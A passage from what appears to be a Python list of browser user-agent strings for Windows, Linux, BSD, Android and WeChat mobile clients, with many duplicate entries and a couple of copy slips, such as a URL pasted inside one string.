     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
